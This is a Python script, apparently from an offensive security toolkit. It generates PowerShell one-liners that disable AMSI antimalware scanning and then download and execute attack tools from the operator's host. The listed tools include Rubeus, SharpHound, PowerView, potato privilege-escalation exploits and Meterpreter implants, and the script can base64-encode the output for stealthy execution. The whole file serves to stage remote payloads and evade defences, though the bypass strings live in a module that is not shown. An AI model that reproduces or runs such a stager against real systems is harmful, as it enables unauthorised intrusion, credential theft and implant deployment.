#!/bin/env python3
import ak
import argparse
import base64
import os
import sys

# Tool type:
# Reflective EXE - load and execute
# Powershell - execute
# Normal exe - dl and run
# Archive - dl and extract

TOOLS = {
  "adpeas":"adPEAS.ps1",
  "efspotato":"EfsPotato.exe",
  "getuserspns":"tools/GetUserSPNs.ps1",
  "hostrecon":"tools/HostRecon.ps1",
  "implantdll":"met.dll",
  "implantexe":"met.exe",
  "lapstoolkit":"tools/LAPSToolkit.ps1",
  "powermad":"tools/powermad.ps1",
  "powersharppack":"tools/PowerSharpPack/PowerSharpPack.ps1",
  "powerupsql":"tools/PowerUpSQL.ps1",
  "powerview":"tools/powerview.ps1",
  "pslessexec":"tools/PSLessExec.exe",
  "rubeus":"tools/Rubeus.exe",
  "run_ps":"run.txt",
  "metexe":"met.exe",
  "metdll":"metdll",
  "sharphound":"tools/SharpHound.exe",
  "sharpsploit":"tools/PowerSharpPack/PowerSharpBinaries/Invoke-SharpSploit.ps1",
  "sharpup":"tools/SharpUp.exe",
  "sysinternals":"tools/sysinternals.zip",
  "winpeas":"tools/winPEASx64.exe",
}

def b64_encode(s):
  b64_encoded = base64.b64encode(s.encode('utf-16le'))
  b64_str = b64_encoded.decode("utf-8")
  return b64_str


def main():
  parser = argparse.ArgumentParser()
  parser.add_argument('--amsi', default=True, action=argparse.BooleanOptionalAction)
  parser.add_argument('--base64', '-b', action=argparse.BooleanOptionalAction)
  parser.add_argument('tool', choices=TOOLS)

  args = parser.parse_args()

  s = ""

  if args.amsi:
    s += ak.PS_AMSI + ';'

  if not os.path.exists(ak.WEBROOT + "/" + TOOLS[args.tool]):
    print("Tool not found at:" + ak.WEBROOT + "/" + TOOLS[args.tool])
    sys.exit(1)

  s += ak.PS_IEX_WEBCLIENT.format(LHOST=ak.LHOST, tool=TOOLS[args.tool])

  if args.base64:
    s = b64_encode(s)

  print(s)


if __name__ == "__main__":
  main()
